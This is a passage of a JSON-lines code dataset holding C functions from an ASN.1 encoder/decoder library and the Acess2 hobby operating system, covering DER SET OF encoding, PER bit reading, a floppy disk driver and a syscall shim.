1, tag,\n\t\tcb, app_key);\n\tif(encoding_size == -1) {\n\t\terval.encoded = -1;\n\t\terval.failed_type = td;\n\t\terval.structure_ptr = ptr;\n\t\treturn erval;\n\t}\n\tcomputed_size += encoding_size;\n\n\tif(!cb || list->count == 0) {\n\t\terval.encoded = computed_size;\n\t\t_ASN_ENCODED_OK(erval);\n\t}\n\n\t/*\n\t * DER mandates dynamic sorting of the SET OF elements\n\t * according to their encodings. Build an array of the\n\t * encoded elements.\n\t */\n\tencoded_els = (struct _el_buffer *)MALLOC(\n\t\t\t\tlist->count * sizeof(encoded_els[0]));\n\tif(encoded_els == NULL) {\n\t\terval.encoded = -1;\n\t\terval.failed_type = td;\n\t\terval.structure_ptr = ptr;\n\t\treturn erval;\n\t}\n\n\tASN_DEBUG(\"Encoding members of %s SET OF\", td->name);\n\n\t/*\n\t * Encode all members.\n\t */\n\tfor(edx = 0; edx < list->count; edx++) {\n\t\tvoid *memb_ptr = list->array[edx];\n\t\tstruct _el_buffer *encoded_el = &encoded_els[eels_count];\n\n\t\tif(!memb_ptr) continue;\n\n\t\t/*\n\t\t * Prepare space for encoding.\n\t\t */\n\t\tencoded_el->buf = (uint8_t *)MALLOC(max_encoded_len);\n\t\tif(encoded_el->buf) {\n\t\t\tencoded_el->length = 0;\n\t\t\tencoded_el->size = max_encoded_len;\n\t\t} else {\n\t\t\tfor(edx--; edx >= 0; edx--)\n\t\t\t\tFREEMEM(encoded_els[edx].buf);\n\t\t\tFREEMEM(encoded_els);\n\t\t\terval.encoded = -1;\n\t\t\terval.failed_type = td;\n\t\t\terval.structure_ptr = ptr;\n\t\t\treturn erval;\n\t\t}\n\n\t\t/*\n\t\t * Encode the member into the prepared space.\n\t\t */\n\t\terval = der_encoder(elm_type, memb_ptr, 0, elm->tag,\n\t\t\t_el_addbytes, encoded_el);\n\t\tif(erval.encoded == -1) {\n\t\t\tfor(; edx >= 0; edx--)\n\t\t\t\tFREEMEM(encoded_els[edx].buf);\n\t\t\tFREEMEM(encoded_els);\n\t\t\treturn erval;\n\t\t}\n\t\tencoding_size += erval.encoded;\n\t\teels_count++;\n\t}\n\n\t/*\n\t * Sort the encoded elements according to their encoding.\n\t */\n\tqsort(encoded_els, eels_count, sizeof(encoded_els[0]), _el_buf_cmp);\n\n\t/*\n\t * Report encoded elements to the application.\n\t * Dispose of temporary sorted members table.\n\t */\n\tret = 0;\n\tfor(edx = 0; edx < eels_count; edx++) {\n\t\tstruct _el_buffer *encoded_el = &encoded_els[edx];\n\t\t/* Report encoded chunks to the application */\n\t\tif(ret == 0\n\t\t&& cb(encoded_el->buf, encoded_el->length, app_key) < 0)\n\t\t\tret = -1;\n\t\tFREEMEM(encoded_el->buf);\n\t}\n\tFREEMEM(encoded_els);\n\n\tif(ret || computed_size != (size_t)encoding_size) {\n\t\t/*\n\t\t * Standard callback failed, or\n\t\t * encoded size is not equal to the computed size.\n\t\t */\n\t\terval.encoded = -1;\n\t\terval.failed_type = td;\n\t\terval.structure_ptr = ptr;\n\t} else {\n\t\terval.encoded = computed_size;\n\t}\n\n\t_ASN_ENCODED_OK(erval);\n}", "path": "asn1\\constr_SET_OF.c", "repo_name": "AlanQuatermain/mac-app-store-validation-sample", "stars": 107, "license": "None", "language": "c", "size": 856}
{"docstring": "/*\n * Get the normally small non-negative whole number.\n * X.691, #10.6\n */\n", "func_signal": "ssize_t\nuper_get_nsnnwn(asn_per_data_t *pd)", "code": "{\n\tssize_t value;\n\n\tvalue = per_get_few_bits(pd, 7);\n\tif(value & 64) {\t/* implicit (value < 0) */\n\t\tvalue &= 63;\n\t\tvalue <<= 2;\n\t\tvalue |= per_get_few_bits(pd, 2);\n\t\tif(value & 128)\t/* implicit (value < 0) */\n\t\t\treturn -1;\n\t\tif(value == 0)\n\t\t\treturn 0;\n\t\tif(value >= 3)\n\t\t\treturn -1;\n\t\tvalue = per_get_few_bits(pd, 8 * value);\n\t\treturn value;\n\t}\n\n\treturn value;\n}", "path": "asn1\\per_support.c", "repo_name": "AlanQuatermain/mac-app-store-validation-sample", "stars": 107, "license": "None", "language": "c", "size": 856}
{"docstring": "/*\n * Extract a small number of bits (<= 31) from the specified PER data pointer.\n */\n", "func_signal": "int32_t\nper_get_few_bits(asn_per_data_t *pd, int nbits)", "code": "{\n\tsize_t off;\t/* Next after last bit offset */\n\tssize_t nleft;\t/* Number of bits left in this stream */\n\tuint32_t accum;\n\tconst uint8_t *buf;\n\n\tif(nbits < 0)\n\t\treturn -1;\n\n\tnleft = pd->nbits - pd->nboff;\n\tif(nbits > nleft) {\n\t\tint32_t tailv, vhead;\n\t\tif(!pd->refill || nbits > 31) return -1;\n\t\t/* Accumulate unused bytes before refill */\n\t\tASN_DEBUG(\"Obtain the rest %d bits (want %d)\", nleft, nbits);\n\t\ttailv = per_get_few_bits(pd, nleft);\n\t\tif(tailv < 0) return -1;\n\t\t/* Refill (replace pd contents with new data) */\n\t\tif(pd->refill(pd))\n\t\t\treturn -1;\n\t\tnbits -= nleft;\n\t\tvhead = per_get_few_bits(pd, nbits);\n\t\t/* Combine the rest of previous pd with the head of new one */\n\t\ttailv = (tailv << nbits) | vhead;  /* Could == -1 */\n\t\treturn tailv;\n\t}\n\n\t/*\n\t * Normalize position indicator.\n\t */\n\tif(pd->nboff >= 8) {\n\t\tpd->buffer += (pd->nboff >> 3);\n\t\tpd->nbits  -= (pd->nboff & ~0x07);\n\t\tpd->nboff  &= 0x07;\n\t}\n\tpd->moved += nbits;\n\tpd->nboff += nbits;\n\toff = pd->nboff;\n\tbuf = pd->buffer;\n\n\t/*\n\t * Extract specified number of bits.\n\t */\n\tif(off <= 8)\n\t\taccum = nbits ? (buf[0]) >> (8 - off) : 0;\n\telse if(off <= 16)\n\t\taccum = ((buf[0] << 8) + buf[1]) >> (16 - off);\n\telse if(off <= 24)\n\t\taccum = ((buf[0] << 16) + (buf[1] << 8) + buf[2]) >> (24 - off);\n\telse if(off <= 31)\n\t\taccum = ((buf[0] << 24) + (buf[1] << 16)\n\t\t\t+ (buf[2] << 8) + (buf[3])) >> (32 - off);\n\telse if(nbits <= 31) {\n\t\tasn_per_data_t tpd = *pd;\n\t\t/* Here are we with our 31-bits limit plus 1..7 bits offset. */\n\t\tper_get_undo(&tpd, nbits);\n\t\t/* The number of available bits in the stream allow\n\t\t * for the following operations to take place without\n\t\t * invoking the ->refill() function */\n\t\taccum  = per_get_few_bits(&tpd, nbits - 24) << 24;\n\t\taccum |= per_get_few_bits(&tpd, 24);\n\t} else {\n\t\tper_get_undo(pd, nbits);\n\t\treturn -1;\n\t}\n\n\taccum &= (((uint32_t)1 << nbits) - 1);\n\n\tASN_DEBUG(\"  [PER got %2d<=%2d bits => span %d %+d[%d..%d]:%02x (%d) => 0x%x]\",\n\t\tnbits, nleft,\n\t\tpd->moved,\n\t\t(((int)pd->buffer) & 0xf),\n\t\tpd->nboff, pd->nbits,\n\t\tpd->buffer[0],\n\t\tpd->nbits - pd->nboff,\n\t\t(int)accum);\n\n\treturn accum;\n}", "path": "asn1\\per_support.c", "repo_name": "AlanQuatermain/mac-app-store-validation-sample", "stars": 107, "license": "None", "language": "c", "size": 856}
{"docstring": "/*\n * Get the length \"n\" from the stream.\n */\n", "func_signal": "ssize_t\nuper_get_length(asn_per_data_t *pd, int ebits, int *repeat)", "code": "{\n\tssize_t value;\n\n\t*repeat = 0;\n\n\tif(ebits >= 0) return per_get_few_bits(pd, ebits);\n\n\tvalue = per_get_few_bits(pd, 8);\n\tif(value < 0) return -1;\n\tif((value & 128) == 0)\t/* #10.9.3.6 */\n\t\treturn (value & 0x7F);\n\tif((value & 64) == 0) {\t/* #10.9.3.7 */\n\t\tvalue = ((value & 63) << 8) | per_get_few_bits(pd, 8);\n\t\tif(value < 0) return -1;\n\t\treturn value;\n\t}\n\tvalue &= 63;\t/* this is \"m\" from X.691, #10.9.3.8 */\n\tif(value < 1 || value > 4)\n\t\treturn -1;\n\t*repeat = 1;\n\treturn (16384 * value);\n}", "path": "asn1\\per_support.c", "repo_name": "AlanQuatermain/mac-app-store-validation-sample", "stars": 107, "license": "None", "language": "c", "size": 856}
{"docstring": "/**\n * \\param ArgTypes\n *\n * Whitespace is ignored\n * >i:\tInput Integer (32-bits)\n * >I:\tInput Long Integer (64-bits)\n * >s:\tInput String\n * >d:\tInput Buffer (Preceded by valid size)\n * <I:\tOutput long integer\n * <d:\tOutput Buffer (Preceded by valid size)\n * ?d:  Bi-directional buffer (Preceded by valid size), buffer contents\n *      are returned\n */\n", "func_signal": "uint64_t _Syscall(int SyscallID, const char *ArgTypes, ...)", "code": "{\n\tva_list\targs;\n\t int\tparamCount, dataLength;\n\t int\tretCount = 2, retLength = sizeof(uint64_t) + sizeof(uint32_t);\n\tvoid\t**retPtrs;\t// Pointers to return buffers\n\tconst char\t*str;\n\ttRequestHeader\t*req;\n\tvoid\t*dataPtr;\n\tuint64_t\tretValue;\n\t\n\t// DEBUG!\n//\tprintf(\"&tRequestHeader->Params = %i\\n\", offsetof(tRequestHeader, Params));\n//\tprintf(\"&tRequestValue->Flags = %i\\n\", offsetof(tRequestValue, Flags));\n//\tprintf(\"&tRequestValue->Length = %i\\n\", offsetof(tRequestValue, Length));\n\t\n\t// Get data size\n\tva_start(args, ArgTypes);\n\tstr = ArgTypes;\n\tparamCount = 0;\n\tdataLength = 0;\n\twhile(*str)\n\t{\n\t\ttRequestValue\ttmpVal;\n\t\t\n\t\tstr = ReadEntry(&tmpVal, NULL, NULL, str, &args);\n\t\tif( !str ) {\n\t\t\tfprintf(stderr, \"syscalls.c: ReadEntry failed (SyscallID = %i)\\n\", SyscallID);\n\t\t\texit(127);\n\t\t}\n\t\tparamCount ++;\n\t\tif( !(tmpVal.Flags & ARG_FLAG_ZEROED) )\n\t\t\tdataLength += tmpVal.Length;\n\t\t\n\t\tif( tmpVal.Flags & ARG_FLAG_RETURN ) {\n\t\t\tretLength += tmpVal.Length;\n\t\t\tretCount ++;\n\t\t}\n\t}\n\tva_end(args);\n\t\n\tdataLength += sizeof(tRequestHeader) + paramCount*sizeof(tRequestValue);\n\tretLength += sizeof(tRequestHeader) + retCount*sizeof(tRequestValue);\n\t\n\t// Allocate buffers\n\tretPtrs = malloc( sizeof(void*) * (retCount+1) );\n\tif( dataLength > retLength)\n\t\treq = malloc( dataLength );\n\telse\n\t\treq = malloc( retLength );\n\treq->ClientID = 0;\t//< Filled later\n\treq->CallID = SyscallID;\n\treq->NParams = paramCount;\n\treq->MessageLength = dataLength;\n\tdataPtr = &req->Params[paramCount];\n\t\n\t// Fill `output` and `input`\n\tva_start(args, ArgTypes);\n\tstr = ArgTypes;\n\t// - re-zero so they can be used as indicies\n\tparamCount = 0;\n\tretCount = 0;\n\twhile(*str)\n\t{\t\t\n\t\tstr = ReadEntry(&req->Params[paramCount], dataPtr, &retPtrs[retCount], str, &args);\n\t\tif( !str )\tbreak;\n\t\t\n\t\tif( !(req->Params[paramCount].Flags & ARG_FLAG_ZEROED) )\n\t\t\tdataPtr += req->Params[paramCount].Length;\n\t\tif( req->Params[paramCount].Flags & ARG_FLAG_RETURN )\n\t\t\tretCount ++;\n\t\t\n\t\tparamCount ++;\n\t}\n\tva_end(args);\n\t\n\t// --- Send syscall request\n\tif( SendRequest(req, dataLength, retLength) < 0 ) {\n\t\tfprintf(stderr, \"syscalls.c: SendRequest failed (SyscallID = %i)\\n\", SyscallID);\n\t\texit(127);\n\t}\n\t\n\tif( !(req->NParams >= 2) ) {\n\t\tfprintf(stderr, \"syscalls.c: Too few return params (%i)\", req->NParams);\n\t\texit(127);\n\t}\n\tdataPtr = (void*)&req->Params[req->NParams];\n\t// return\n\tassert(req->Params[0].Type == ARG_TYPE_INT64);\n\tassert(req->Params[0].Length == sizeof(uint64_t));\n\tretValue = *(uint64_t*)dataPtr;\n\tdataPtr += sizeof(uint64_t);\n\t// errno\n\tassert(req->Params[1].Type == ARG_TYPE_INT32);\n\tassert(req->Params[1].Length == sizeof(uint32_t));\n\tacess__errno = *(uint32_t*)dataPtr;\n\tdataPtr += sizeof(uint32_t);\n\t\n\t// Write changes to buffers\n\tif( req->NParams - 2 != retCount ) {\n\t\tfprintf(stderr, \"syscalls.c: Return count inbalance (%i - 1 != exp %i) [Call %i]\\n\",\n\t\t\treq->NParams, retCount, SyscallID);\n\t\texit(127);\n\t}\n\tretCount = 0;\n\tfor( unsigned int i = 2; i < req->NParams; i ++ )\n\t{\n\t\t#if 0\n\t\t int\t j;\n\t\tprintf(\"Return Data %i: (%i)\", i, req->Params[i].Length);\n\t\tfor( j = 0; j < req->Params[i].Length; j ++ )\n\t\t\tprintf(\" %02x\", ((uint8_t*)dataPtr)[j]);\n\t\tprintf(\"\\n\");\n\t\t#endif\n\t\tassert( req->Params[i].Type == ARG_TYPE_DATA );\n\t\tmemcpy( retPtrs[retCount++], dataPtr, req->Params[i].Length );\n\t\tdataPtr += req->Params[i].Length;\n\t}\n\t\n\tfree( req );\n\tfree( retPtrs );\n\t\n\tif( gbSyscallDebugEnabled ) {\n\t\tSYSTRACE(\": %i 0x%llx\", SyscallID, retValue);\n\t}\n\t\n\treturn retValue;\n}", "path": "AcessNative\\ld-acess_src\\syscalls.c", "repo_name": "thepowersgang/acess2", "stars": 80, "license": "zlib", "language": "c", "size": 10589}
{"docstring": "/**\n * \\brief Stops FDD Motor\n */\n", "func_signal": "void FDD_int_StopMotorCallback(void *Arg)", "code": "{\n\tUint8\tstate, disk = (Uint)Arg;\n\n\t// Mutex is only locked if disk is in use\n\tif( Mutex_IsLocked(&glFDD) )\treturn ;\n\n\tENTER(\"iDisk\", disk);\n\n\t// Clear motor on bit\t\n\tstate = inb( cPORTBASE[ disk>>1 ] + PORT_DIGOUTPUT );\n\tstate &= ~( 1 << (4+disk) );\n\toutb( cPORTBASE[ disk>>1 ] + PORT_DIGOUTPUT, state );\n\t\n\t// Mark as off\n\tgFDD_Devices[disk].motorState = 0;\n\n\tLEAVE('-');\n}", "path": "KernelLand\\Modules\\Storage\\FDD\\fdd.c", "repo_name": "thepowersgang/acess2", "stars": 80, "license": "zlib", "language": "c", "size": 10589}
{"docstring": "// --- NSR Control\n", "func_signal": "void acessnsr_ctrl_channel_event_ind(udi_channel_event_cb_t *cb)", "code": "{\n\tacessnsr_rdata_t *rdata = UDI_GCB(cb)->context;\n\tswitch(cb->event)\n\t{\n\tcase UDI_CHANNEL_CLOSED:\n\t\tbreak;\n\tcase UDI_CHANNEL_BOUND: {\n\t\trdata->active_cb = UDI_GCB(cb);\n\t\tudi_channel_spawn(acessnsr_ctrl_ch_ev_ind__rx_channel_spawned,\n\t\t\tcb->params.parent_bound.bind_cb, UDI_GCB(cb)->channel,\n\t\t\t1, ACESSNSR_OPS_RX, rdata);\n\t\t// V V V V\n\t\tbreak; }\n\t}\n}", "path": "KernelLand\\Modules\\Interfaces\\UDI\\trans\\nsr.c", "repo_name": "thepowersgang/acess2", "stars": 80, "license": "zlib", "language": "c", "size": 10589}
{"docstring": "/**\n * \\fn int FDD_WriteSector(Uint32 Disk, Uint64 LBA, void *Buffer)\n * \\brief Write a sector to the floppy disk\n * \\note Not Implemented\n */\n", "func_signal": "int FDD_WriteSector(Uint32 Disk, Uint64 LBA, void *Buffer)", "code": "{\n\tLog_Warning(\"FDD\", \"Read Only at the moment\");\n\treturn -1;\n}", "path": "KernelLand\\Modules\\Storage\\FDD\\fdd.c", "repo_name": "thepowersgang/acess2", "stars": 80, "license": "zlib", "language": "c", "size": 10589}
{"docstring": "// === FUNCTIONS ===\n", "func_signal": "int UI_Initialise(int MaxWidth, int MaxHeight)", "code": "{\t\n\t// Changed when the video mode is set\n\tgiUI_Width = MaxWidth;\n\tgiUI_Height = MaxHeight;\n\t\n\t// Set up video\n\tSDL_Init(SDL_INIT_VIDEO);\n\tprintf(\"UI attempting %ix%i %ibpp\\n\", giUI_Width, giUI_Height, 32);\n\tgScreen = SDL_SetVideoMode(giUI_Width, giUI_Height, 32, SDL_DOUBLEBUF);\n \tif( !gScreen ) {\n\t\tfprintf(stderr, \"Couldn't set %ix%i video mode: %s\\n\", giUI_Width, giUI_Height, SDL_GetError());\n\t\tSDL_Quit();\n \t \texit(2);\n\t}\n\tSDL_WM_SetCaption(\"Acess2\", \"Acess2\");\n\t\n\tgiUI_Width = gScreen->w;\n\tgiUI_Height = gScreen->h;\n\tgiUI_Pitch = gScreen->pitch;\n\n\tprintf(\"UI window %ix%i %i bytes per line\\n\", giUI_Width, giUI_Height, giUI_Pitch);\n\t\n\tSDL_EnableUNICODE(1);\n\n\treturn 0;\n}", "path": "AcessNative\\acesskernel_src\\ui_sdl.c", "repo_name": "thepowersgang/acess2", "stars": 80, "license": "zlib", "language": "c", "size": 10589}
{"docstring": "// === CODE ===\n// --- Management metalang\n", "func_signal": "void acessnsr_usage_ind(udi_usage_cb_t *cb, udi_ubit8_t resource_level)", "code": "{\n\tacessnsr_rdata_t *rdata = UDI_GCB(cb)->context;\n\tswitch(resource_level)\n\t{\n\t}\n\n\tWorkqueue_Init(&rdata->RXQueue, \"AcessNSR RX\", offsetof(udi_nic_rx_cb_t, chain));\n\tWorkqueue_Init(&rdata->TXWorkQueue, \"AcessNSR TX\", offsetof(udi_nic_tx_cb_t, chain));\n\n\tudi_usage_res(cb);\n}", "path": "KernelLand\\Modules\\Interfaces\\UDI\\trans\\nsr.c", "repo_name": "thepowersgang/acess2", "stars": 80, "license": "zlib", "language": "c", "size": 10589}
{"docstring": "// === CODE ===\n/**\n * \\fn int FDD_Install(char **Arguments)\n * \\brief Installs floppy driver\n */\n", "func_signal": "int FDD_Install(char **Arguments)", "code": "{\n\tUint8 data;\n\tchar\t**args = Arguments;\n\t\n\t// Determine Floppy Types (From CMOS)\n\toutb(0x70, 0x10);\n\tdata = inb(0x71);\n\tgFDD_Devices[0].type = data >> 4;\n\tgFDD_Devices[1].type = data & 0xF;\n\tgFDD_Devices[0].track[0] = -1;\n\tgFDD_Devices[1].track[1] = -1;\n\t\n\tLog_Log(\"FDD\", \"Detected Disk 0: %s and Disk 1: %s\", cFDD_TYPES[data>>4], cFDD_TYPES[data&0xF]);\n\t\n\tif( data == 0 ) {\n\t\treturn MODULE_ERR_NOTNEEDED;\n\t}\n\t\n\t// Handle arguments\n\tif(args) {\n\t\tfor(;*args;args++)\n\t\t{\n\t\t\tif(strcmp(*args, \"disable\")==0)\n\t\t\t\treturn MODULE_ERR_NOTNEEDED;\n\t\t}\n\t}\n\t\n\t// Install IRQ6 Handler\n\tIRQ_AddHandler(6, FDD_IRQHandler, NULL);\n\n\t// Ensure the FDD version is 0x90\n\t{\n\t\tUint8\ttmp = 0;\n\t\tFDD_int_SendByte(cPORTBASE[0], CMD_VERSION);\n\t\tFDD_int_GetByte(cPORTBASE[0], &tmp);\n\t\tif( tmp != 0x90 ) {\n\t\t\tLog_Error(\"FDD\", \"Version(0x%2x) != 0x90\", tmp);\n\t\t\treturn MODULE_ERR_NOTNEEDED;\n\t\t}\n\t}\n\n\t// Configure\n\tFDD_Reconfigure(0);\n\n\t// Reset Primary FDD Controller\n\tif( FDD_Reset(0) != 0 ) {\n\t\treturn MODULE_ERR_MISC;\n\t}\n\n\t#if 0\n\t{\n\t\t int\tretries;\n\t\t// Recalibrate disks\n\t\tLOG(\"Recalibrate disks (16x seek)\");\n\t\tretries = 16;\n\t\twhile(FDD_int_SeekTrack(0, 0, 1) == 0 && retries --)\n\t\t\tThreads_Yield();\t// set track\n\t\tif(retries < 0)\tLEAVE_RET('i', -1);\n\t\n\t\tretries = 16;\n\t\twhile(FDD_int_SeekTrack(0, 1, 1) == 0 && retries --)\n\t\t\tThreads_Yield();\t// set track\n\t\tif(retries < 0)\tLEAVE_RET('i', -1);\n\t}\n\t#endif\n\t\n\t\n\t// Initialise Root Node\n\tgFDD_DriverInfo.RootNode.CTime = gFDD_DriverInfo.RootNode.MTime\n\t\t= gFDD_DriverInfo.RootNode.ATime = now();\n\t\n\t// Initialise Child Nodes\n\tgFDD_Devices[0].Node.Inode = 0;\n\tgFDD_Devices[0].Node.Flags = 0;\n\tgFDD_Devices[0].Node.NumACLs = 0;\n\tgFDD_Devices[0].Node.Read = FDD_ReadFS;\n\tgFDD_Devices[0].Node.Write = NULL;//FDD_WriteFS;\n\tmemcpy(&gFDD_Devices[1].Node, &gFDD_Devices[0].Node, sizeof(tVFS_Node));\n\t\n\tgFDD_Devices[1].Node.Inode = 1;\n\t\n\t// Set Lengths\n\tgFDD_Devices[0].Node.Size = cFDD_SIZES[data >> 4];\n\tgFDD_Devices[1].Node.Size = cFDD_SIZES[data & 0xF];\n\t\n\t// Create Sector Cache\n\tif( cFDD_SIZES[data >> 4] )\n\t{\n\t\tgFDD_Devices[0].CacheHandle = IOCache_Create(\n\t\t\tFDD_WriteSector, 0, 512,\n\t\t\tgFDD_Devices[0].Node.Size / (512*4)\n\t\t\t);\t// Cache is 1/4 the size of the disk\n\t}\n\tif( cFDD_SIZES[data & 15] )\n\t{\n\t\tgFDD_Devices[1].CacheHandle = IOCache_Create(\n\t\t\tFDD_WriteSector, 0, 512,\n\t\t\tgFDD_Devices[1].Node.Size / (512*4)\n\t\t\t);\t// Cache is 1/4 the size of the disk\n\t}\n\t\n\t// Register with devfs\n\tDevFS_AddDevice(&gFDD_DriverInfo);\n\t\n\treturn MODULE_ERR_OK;\n}", "path": "KernelLand\\Modules\\Storage\\FDD\\fdd.c", "repo_name": "thepowersgang/acess2", "stars": 80, "license": "zlib", "language": "c", "size": 10589}
{"docstring": "// === CODE ===\n", "func_signal": "int main(int argc, char *argv[], char **envp)", "code": "{\n\t int\ti;\n\t int\tappArgc;\n\tchar\t**appArgv;\n\tchar\t*appPath = NULL;\n\t int\t(*appMain)(int, char *[], char **);\n\tvoid\t*base;\n\t int\trv;\n\n\tgEnvP = envp;\n\t\n\tRequest_Preinit();\n\n//\t int\tsyscall_handle = -1;\n\t\n\tfor( i = 1; i < argc; i ++ )\n\t{\n\t\tif(strcmp(argv[i], \"--key\") == 0) {\n\t\t\tgiSyscall_ClientID = atoi(argv[++i]);\n\t\t\tcontinue ;\n\t\t}\n\n\t\tif(strcmp(argv[i], \"--socket\") == 0) {\n\t\t\tgSocket = atoi(argv[++i]);\n\t\t\tcontinue ;\n\t\t}\n\t\t\n\t\tif(strcmp(argv[i], \"--binary\") == 0) {\n\t\t\tappPath = argv[++i];\n\t\t\tcontinue ;\n\t\t}\n\t\t\n\t\tif(strcmp(argv[i], \"--open\") == 0) {\n\t\t\tif( acess__SysOpen(argv[++i], 6) == -1 ) {\t// Read/Write\n\t\t\t\tfprintf(stderr, \"Unable to open '%s'\\n\", argv[i]);\n\t\t\t\texit(1);\n\t\t\t}\n\t\t\tcontinue ;\n\t\t}\n\t\tif( strcmp(argv[i], \"--trace\") == 0 ) {\n\t\t\tgbSyscallDebugEnabled = 1;\n\t\t\tcontinue ;\n\t\t}\n\t\t\n\t\tif( argv[i][0] != '-' )\tbreak;\n\t}\n\n\tif( i >= argc ) {\n\t\tfprintf(stderr,\n\t\t\t\"Usage: ld-acess <executable> [arguments ...]\\n\"\n\t\t\t\"\\n\"\n\t\t\t\"--key\\t(internal) used to pass the system call handle when run with execve\\n\"\n\t\t\t\"--binary\\tLoad a local binary directly\\n\"\n\t\t\t\"--open\\tOpen a file before executing\\n\"\n\t\t\t);\n\t\treturn 1;\n\t}\n\t\n\tif( !appPath )\n\t\tappPath = argv[i];\n\n\tappArgc = argc - i;\n\tappArgv = &argv[i];\n\n//\tprintf(\"Exectutable Path: '%s'\\n\", appPath);\n//\tprintf(\"Executable argc = %i\\n\", appArgc);\n\n\tbase = Binary_Load(appPath, (uintptr_t*)&appMain);\n\tprintf(\"[DEBUG %i] base = %p\\n\", giSyscall_ClientID, base);\n\tif( !base )\t{\n\t\t*((char*)NULL) = 0;\n\t\treturn 127;\n\t}\n\t\n\tprintf(\"==============================\\n\");\n\tprintf(\"[DEBUG %i] %i \", giSyscall_ClientID, appArgc);\n\tfor(i = 0; i < appArgc; i ++)\n\t\tprintf(\"\\\"%s\\\" \", appArgv[i]);\n\tprintf(\"\\n\");\n\tprintf(\"[DEBUG %i] appMain = %p\\n\", giSyscall_ClientID, appMain);\n//\tCallUser(appMain, appArgc, appArgv, envp);\n\trv = appMain(appArgc, appArgv, envp);\n\tacess__exit(rv);\n\treturn rv;\n}", "path": "AcessNative\\ld-acess_src\\main.c", "repo_name": "thepowersgang/acess2", "stars": 80, "license": "zlib", "language": "c", "size": 10589}
{"docstring": "// -- Timers --\n", "func_signal": "void Timer_IRQHandler_SysClock(int IRQ, void *_unused)", "code": "{\n\tgiTimestamp += 100;\n\tgpTimersMap->TMR1.PCR_0 = (1<<30);\n\tTimer_CallTimers();\n}", "path": "KernelLand\\Kernel\\arch\\armv7\\platform_tegra2.c", "repo_name": "thepowersgang/acess2", "stars": 80, "license": "zlib", "language": "c", "size": 10589}
{"docstring": "/**\n * \\brief Reads \\a Count contiguous sectors from a disk\n * \\param SectorAddr\tAddress of the first sector\n * \\param Count\tNumber of sectors to read\n * \\param Buffer\tDestination Buffer\n * \\param Disk\tDisk Number\n * \\return Number of sectors read\n * \\note Used as a ::DrvUtil_ReadBlock helper\n */\n", "func_signal": "Uint FDD_ReadSectors(Uint64 SectorAddr, Uint Count, void *Buffer, Uint Disk)", "code": "{\n\tUint\tret = 0;\n\twhile(Count --)\n\t{\n\t\tif( FDD_ReadSector(Disk, SectorAddr, Buffer) != 1 )\n\t\t\treturn ret;\n\t\t\n\t\tBuffer = (void*)( (tVAddr)Buffer + 512 );\n\t\tSectorAddr ++;\n\t\tret ++;\n\t}\n\treturn ret;\n}", "path": "KernelLand\\Modules\\Storage\\FDD\\fdd.c", "repo_name": "thepowersgang/acess2", "stars": 80, "license": "zlib", "language": "c", "size": 10589}
{"docstring": "/**\n * \\brief Recalibrate the specified disk\n */\n", "func_signal": "void FDD_Recalibrate(int disk)", "code": "{\n\tENTER(\"idisk\", disk);\n\t\n\tLOG(\"Starting Motor\");\n\tFDD_int_StartMotor(disk);\n\t// Wait for Spinup\n\twhile(gFDD_Devices[disk].motorState <= 1)\tThreads_Yield();\n\t\n\tLOG(\"Sending Calibrate Command\");\n\tFDD_int_SendByte(cPORTBASE[disk>>1], CMD_RECALIBRATE);\n\tFDD_int_SendByte(cPORTBASE[disk>>1], disk&1);\n\t\n\tLOG(\"Waiting for IRQ\");\n\tFDD_WaitIRQ();\n\tFDD_SenseInt(cPORTBASE[disk>>1], NULL, NULL);\n\t\n\tLOG(\"Stopping Motor\");\n\tFDD_int_StopMotor(disk);\n\tLEAVE('-');\n}", "path": "KernelLand\\Modules\\Storage\\FDD\\fdd.c", "repo_name": "thepowersgang/acess2", "stars": 80, "license": "zlib", "language": "c", "size": 10589}
{"docstring": "// === CODE ===\n", "func_signal": "tFile *File_New(void)", "code": "{\n\ttFile *ret = calloc(1, sizeof(tFile) + 1);\n\tret->nLines = 0;\n\tret->FirstLine = NULL;\n\tret->NameOfs = 0;\n\tret->Path[0] = 0;\n\treturn ret;\n}", "path": "Usermode\\Applications\\gui_ate_src\\edit.c", "repo_name": "thepowersgang/acess2", "stars": 80, "license": "zlib", "language": "c", "size": 10589}
{"docstring": "/**\n * \\fn void FDD_int_StartMotor(char disk)\n * \\brief Starts FDD Motor\n */\n", "func_signal": "void FDD_int_StartMotor(int disk)", "code": "{\n\tUint8\tstate;\n\tif( gFDD_Devices[disk].motorState != 0 )\treturn ;\n\t// Set motor ON bit\n\tstate = inb( cPORTBASE[ disk>>1 ] + PORT_DIGOUTPUT );\n\tstate |= 1 << (4+disk);\n\toutb( cPORTBASE[ disk>>1 ] + PORT_DIGOUTPUT, state );\n\t// Mark as spinning up\n\tgFDD_Devices[disk].motorState = 1;\n\t// Schedule a timer for when it's up to speed\n\tgFDD_Devices[disk].timer = Time_CreateTimer(MOTOR_ON_DELAY, FDD_int_TimerCallback, (void*)(Uint)disk);\n}", "path": "KernelLand\\Modules\\Storage\\FDD\\fdd.c", "repo_name": "thepowersgang/acess2", "stars": 80, "license": "zlib", "language": "c", "size": 10589}
{"docstring": "/**\n * \\brief Find File Routine (for vfs_node)\n */\n", "func_signal": "tVFS_Node *FDD_FindDir(tVFS_Node *UNUSED(Node), const char *Filename)", "code": "{\n\t int\ti;\n\t\n\tENTER(\"sFilename\", Filename);\n\t\n\t// Sanity check string\n\tif(Filename == NULL) {\n\t\tLEAVE('n');\n\t\treturn NULL;\n\t}\n\t\n\t// Check string length (should be 1)\n\tif(Filename[0] == '\\0' || Filename[1] != '\\0') {\n\t\tLEAVE('n');\n\t\treturn NULL;\n\t}\n\t\n\t// Get First character\n\ti = Filename[0] - '0';\n\t\n\t// Check for 1st disk and if it is present return\n\tif(i == 0 && gFDD_Devices[0].type != 0) {\n\t\tLEAVE('p', &gFDD_Devices[0].Node);\n\t\treturn &gFDD_Devices[0].Node;\n\t}\n\t\n\t// Check for 2nd disk and if it is present return\n\tif(i == 1 && gFDD_Devices[1].type != 0) {\n\t\tLEAVE('p', &gFDD_Devices[1].Node);\n\t\treturn &gFDD_Devices[1].Node;\n\t}\n\t\n\t// Else return null\n\tLEAVE('n');\n\treturn NULL;\n}", "path": "KernelLand\\Modules\\Storage\\FDD\\fdd.c", "repo_name": "thepowersgang/acess2", "stars": 80, "license": "zlib", "language": "c", "size": 10589}
